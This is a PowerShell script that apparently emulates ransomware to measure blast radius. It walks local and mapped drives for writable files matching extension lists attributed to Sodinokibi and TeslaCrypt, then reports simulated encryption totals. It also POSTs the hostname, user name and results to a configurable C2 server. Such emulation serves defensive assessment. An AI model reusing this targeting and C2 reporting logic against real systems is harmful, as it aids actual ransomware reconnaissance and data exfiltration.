Begin {

# Define Variables
$EnumerateTargets=@()
$files=@()
$AffectedFiles=@()
$C2Server = '' # ChangeMe
$C2Port = '1337' # ChangeMe
$C2Schema = 'http://' # ChangeMe
$C2Payload = ""
$Threads = 50


# Sophistication Emulation Range (1-3)
# 1 = Basic: Recursively Enumerates Down Local Drives and Mapped Drives exactly as they are mapped
# 2 = Intermediate: Basic + Enumerates Network Locations/Shortcuts + Attempts to walk up/down network locations - NOT YET IMPLEMENTED
# 3 = Sophisticated: Intermediate + Scans local network for SMB Shares to enumerate starting at root nodes - NOT YET IMPLEMENTED
$SophisticationLevel = 1


# Enumeration Filter Criteria
# Blacklist = Search all files excepte those filters in the blacklist
# Whitelist = Only search files matchines filters in the whitelist
# None = DO not use any whitelist
$EnumerationFilter = "Whitelist"


# Blacklist derived from sodinokibi ransomware
$Blacklist = @("msstyles", "icl", "idx", "rtp", "sys", "nomedia", "dll", "hta", "cur", "lock", "cpl", "ics", "hlp", "com", "spl", "msi", "key", "mpa", "rom", "drv", "bat", "386", "adv", "diagcab", "mod", "scr", "theme", "ocx", "prf", "cab", "diagcfg", "msu", "cmd", "ico", "msc", "ani", "icns", "diagpkg", "deskthemepack", "wpx", "msp", "bin", "themepack", "shs", "nls", "exe", "lnk", "ps1", "ldf", "ntuser.dat", "desktop.ini", "thumbs.db", "iconcache.db", "ntuser.ini", "ntldr", "bootfont.bin", "ntuser.dat.log", "bootsect.bak", "boot.ini", "autorun.inf")

# Whitelist derived from teslacrypt and then added additional common extensions
$Whitelist = @("pdb", "dat", "json", "7z", "zip", "map", "m2", "rb", "jpg", "rar", "wmo", "mcmeta", "png", "cdr", "m4a", "itm", "vfs0", "jpeg", "indd", "wma", "sb", "mpqge", "txt", "ai", "avi", "fos", "kdb", "p7c", "eps", "wmv", "mcgame", "db0", "p7b", "pdf", "csv", "vdf", "DayZProfile", "p12", "pdd", "d3dbsp", "ztmp", "rofl", "pfx", "psd", "sc2save", "sis", "hkx", "pem", "dbfv", "sie", "sid", "bar", "crt", "mdf", "sum", "ncf", "upk", "cer", "wb2", "ibank", "menu", "das", "der", "rtf", "t13", "layout", "iwi", "x3f", "wpd", "t12", "dmp", "litemod", "srw", "dxg", "qdf", "blob", "asset", "pef", "xf", "gdb", "esm", "forge", "ptx", "dwg", "tax", "001", "ltx", "r3d", "pst", "pkpass", "vtf", "bsa", "rw2", "accdb", "bc6", "dazip", "apk", "rwl", "mdb", "bc7", "fpk", "re4", "raw", "pptm", "bkp", "mlx", "sav", "raf", "pptx", "qic", "kf", "lbf", "orf", "ppt", "bkf", "iwd", "slm", "nrw", "xlk", "sidn", "vpk", "bik", "mrwref", "xlsb", "sidd", "tor", "epk", "mef", "xlsm", "mddata", "psk", "rgss3a", "erf", "xlsx", "itl", "rim", "pak", "kdc", "xls", "itdb", "w3x", "big", "dcr", "wps", "icxs", "fsh", "unity3d", "cr2", "docm", "hvpl", "ntl", "wotreplay", "crw", "docx", "hplg", "arch00", "xxx", "bay", "doc", "hkdb", "lvl", "desc", "sr2", "odb", "mdbackup", "snx", "py", "srf", "odc", "syncdb", "cfr", "m3u", "arw", "odm", "gho", "ff", "flv", "3fr", "odp", "cas", "vpp_pc", "js", "dng", "ods", "svg", "lrf", "css", "jpe", "odt", "pps", "xlr", "java", "h", "sh", "vbs", "py", "swift", "ps1", "crt", "cer", "key", "bak", "bkup", "tex", "wks", "m4v", "kbds", "mpeg", "mpg", "mov", "php", "asp", "aspx", "pl", "js", "jsp", "xhtml", "bmp", "gif", "*ico", "svg", "jar", "sql", "tar", "xml", "mp3", "wav", "ogg")

}

Process {
# Build String to be sent as C2 Payload, essentially just console output
$C2Payload += ("Simulating Ransomware Infection Routine!`n")
$C2Payload +=  ("Sophistication Level: " + $SophisticationLevel + "`n")
$C2Payload +=  ("Enumeration Filter Criteria: " + $EnumerationFilter + "`n")
$C2Payload +=  ("Hostname: " + $env:COMPUTERNAME + "`n")
$C2Payload +=  ("Current User: " + $env:USERDOMAIN + '\' + $env:USERNAME + "`n")
Write-Host $C2Payload


# Attempt to reach the C2 Server
if($C2Server){
    Try {
        $C2Status = Invoke-WebRequest -uri ($C2Schema + $C2Server + ":" + $C2Port + "/Status") -Method GET
        Write-Verbose "C2 Connection: OK"
    } Catch {
        Write-Warning "C2 Server is not reachable"
        Exit(1)
    }
}


Function ThreadedEnumeration {

[CmdletBinding()]
param(
    [Parameter(
        Position=0,
        HelpMessage='System or Network Drive to Enumerate')]
    [String]$Drive,
      [Parameter(
        Position=1,
        HelpMessage='Maximum number of threads at the same time (Default=50)')]
    [Int32]$Threads=50,
    [Parameter(
        Position=2,
        HelpMessage='Whitelist of allowed file extensions')]
    [Array]$Whitelist
)

Begin{
    Write-Verbose -Message "Script started at $(Get-Date)"
    $BlastRadius = @()

}

Process{
    function Chunk-Array 
    {

          param($objIn,[int]$parts,[int]$size)
  
          if ($parts) {
            $PartSize = [Math]::Ceiling($objIn.count / $parts)
          } 
          if ($size) {
            $PartSize = $size
            $parts = [Math]::Ceiling($objIn.count / $size)
          }

          $objOut = New-Object 'System.Collections.Generic.List[psobject]'

          for ($i=1; $i -le $parts; $i++) {
            $start = (($i-1)*$PartSize)
            $end = (($i)*$PartSize) - 1
            if ($end -ge $objIn.count) {$end = $objIn.count -1}
	        $objOut.Add(@($objIn[$start..$end]))
          }
          return ,$objOut

    }

    # Scriptblock --> will run in threads...
    [ScriptBlock]$ScriptBlock = {
        Param(
			$chunk,
            $Whitelist=$Null
        )

        # Check For Write Access
        $chunk | ForEach-Object {
            if ($Whitelist){
                if (($Whitelist.Contains($_[-3..-1] -join '')) -and ($_[-4] -eq '.')) {
                    Try{
                        [System.IO.File]::OpenWrite($_).close() # <----- Check does not affect metadata (last access,modifed,created timestamps) of file
                        $writable = Get-Item $_ | select FullName, Name, Length, Extension
                        [PSCustomObject] @{
                            FullName = $writable.FullName
                            Name = $writable.Name
                            Size = $writable.Length
                            Extension = $writable.Extension
                        }
                    } Catch{
                        Write-Verbose ("No Write Permission on: " + $_)
                    } # End Try Catch
                } # End If Whitelist Contains
            } else {

                Try{
                        [System.IO.File]::OpenWrite($_).close() # <----- Check does not affect metadata (last access,modifed,created timestamps) of file
                        $writable = Get-Item $_ | select FullName, Name, Length, Extension
                        [PSCustomObject] @{
                            FullName = $writable.FullName
                            Name = $writable.Name
                            Size = $writable.Length
                            Extension = $writable.Extension
                        }
                    } Catch{
                        Write-Verbose ("No Write Permission on: " + $_)
                    } # End Try Catch

            } # End If/Else WhiteList
                    

             

        } # End Foreach Chunk 

    } # End ScriptBlock

    Write-Verbose -Message "Setting up RunspacePool..."

    # Create RunspacePool and Jobs
    $RunspacePool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, $Threads, $Host)
    $RunspacePool.ApartmentState = "MTA"
    $RunspacePool.Open()
    [System.Collections.ArrayList]$Jobs = @()

    Write-Verbose -Message "Setting up Jobs..."
    
    # This is actually WAY faster than Get-ChildItem
    $dir = cmd /r dir $Drive /s /b /a:-d

    $chunks = Chunk-Array -objIn $dir -parts 150

    foreach($chunk in $chunks)
    {
        # Create job
        $Job = [System.Management.Automation.PowerShell]::Create()
        $null = $Job.AddScript($ScriptBlock)
        $null = $Job.AddArgument($chunk)
        if ($Whitelist) {$null = $Job.AddArgument($Whitelist)}
        $null = $job
        $Job.RunspacePool = $RunspacePool
        $JobObj = [PSCustomObject]@{
            Pipe = $job;
            Result = $job.BeginInvoke()
        }

        # Add job to collection
        [void]$Jobs.Add($JobObj)
    }

    Write-Verbose -Message "Waiting for jobs to complete & starting to process results..."

    # Total jobs to calculate percent complete, because jobs are removed after they are processed
    $Jobs_Total = $Jobs.Count

     # Process results, while waiting for other jobs
    Do {
        # Get all jobs, which are completed
        $Jobs_ToProcess = $Jobs | Where-Object -FilterScript {$_.Result.IsCompleted}
  
        # If no jobs finished yet, wait 500 ms and try again
        if($null -eq $Jobs_ToProcess)
        {
            Write-Verbose -Message "No jobs completed yet, wait 5 sec..."

            Start-Sleep -Seconds 5
            continue
        }
        
        # Get jobs, which are not complete yet
        $Jobs_Remaining = ($Jobs | Where-Object -FilterScript {$_.Result.IsCompleted -eq $false}).Count

        # Catch when trying to divide through zero
        try {            
            $Progress_Percent = 100 - (($Jobs_Remaining / $Jobs_Total) * 100) 
        }
        catch {
            $Progress_Percent = 100
        }

        Write-Progress -Activity "Waiting for jobs to complete... ($($Threads - $($RunspacePool.GetAvailableRunspaces())) of $Threads threads running)" -Id 1 -PercentComplete $Progress_Percent -Status "$Jobs_Remaining remaining..."
      
        Write-Verbose -Message "Processing $(if($null -eq $Jobs_ToProcess.Count){"1"}else{$Jobs_ToProcess.Count}) job(s)..."

        # Processing completed jobs
        foreach($Job in $Jobs_ToProcess)
        {       
            # Get the result...     
            $Job_Result = $Job.Pipe.EndInvoke($Job.Result)
            $Job.Pipe.Dispose()

            # Remove job from collection
            $Jobs.Remove($Job)
           
            # Check if result is null --> if not, return it
            if($Job_Result.Result)
            {         
                   $BlastRadius += $Job_Result                  
            }
        } 

    } While ($Jobs.Count -gt 0)
    
    Write-Verbose -Message "Closing RunspacePool and free resources..."

    # Close the RunspacePool and free resources
    $RunspacePool.Close()
    $RunspacePool.Dispose()

    Write-Verbose -Message "Script finished at $(Get-Date)"
}

End{
    Return $BlastRadius
}

}


# Find Network Drives
$AllDrives = (Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -ne 0})


# If Basic Ransomware
if ($SophisticationLevel -eq 1) {
    $AllDrives | ForEach-Object {
        if ($_.DisplayRoot) {
            $EnumerateTargets += $_.DisplayRoot
        } else {
            $EnumerateTargets += $_.Root
        }
    }
}


# If Intermediate Ransomware
if ($SophisticationLevel -eq 2) {
    # Enumerate Quick Access Network Shortcuts
    $objSh = New-Object -ComObject shell.application
    $QuickAccess = $objSh.Namespace("shell:::{679f85cb-0220-4080-b29b-5540cc05aab6}").Items() | Select-Object Path
    foreach ($path in $QuickAccess) {
    
        Try {
            $RootPath = @(get-item $path.Path).Root.FullName
            if ($RootPath -match '\\\\') {$NetworkDrives+=$RootPath}
        } Catch {
            Write-Verbose "Unable To Access Path"
        }
    }

    $EnumerateTargets = $NetworkDrives += $LocalDrives
    $EnumerateTargets = $EnumerateTargets | Sort-Object -Unique

}

# Loop Through Drives
foreach ($target in $EnumerateTargets | Where-Object{Test-Path $_}) {
   Write-Host ("Enumerating " + $target)
   $C2Payload += ("Enumerating " + $target + "`n")

   # Enumerate Files using Filter Style Blacklist or Whitelist
   if ($EnumerationFilter -eq 'Whitelist'){

       $AffectedFiles += ThreadedEnumeration -Drive $target -Threads $Threads -Whitelist $Whitelist -Verbose


   } else {

       $AffectedFiles += ThreadedEnumeration -Drive $target -Threads $Threads -Verbose

   }

   # Attempt to clean up garbage? Make it faster??
   [GC]::Collect()
}

$AffectedFiles = $AffectedFiles | Where-Object {$_.FullName -ne $null}
# Count of Files
$C2Payload += ("Total Simulated Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count) + "`n")
Write-Host ("Total Simulated Files Encrypted: " + ('{0:N0}' -f $AffectedFiles.Count))


# Sum of Data Size of all Files
$TotalData = ($AffectedFiles | Measure-Object -Sum Size).Sum
if ($TotalData -gt 1GB) {
    Write-Host ("Total Simulated Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
    $C2Payload += ("Total Simulated Data Encrypted (GB): " + [System.Math]::Round(($TotalData / 1GB), 2) + "`n")
} else {
    Write-Host ("Total Simulated Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
    $C2Payload += ("Total Simulated Data Encrypted (MB): " + [System.Math]::Round(($TotalData / 1MB), 2) + "`n")
}

# Top File Types by Extension
$TopTenFileTypes = $AffectedFiles | Group-Object -Property Extension -NoElement | Sort-Object -Property Count -Descending | Select-Object -First 10
Write-host ($TopTenFileTypes | Out-String)
$C2Payload += ($TopTenFileTypes | Out-String)
}

End {

# Post Output Report to C2 Server
if ($C2Server){
    $null = Invoke-WebRequest -Uri ($C2Schema + $C2Server + ":" + $C2Port + "/receive") -Method POST -Body $C2Payload
}
# Done
}
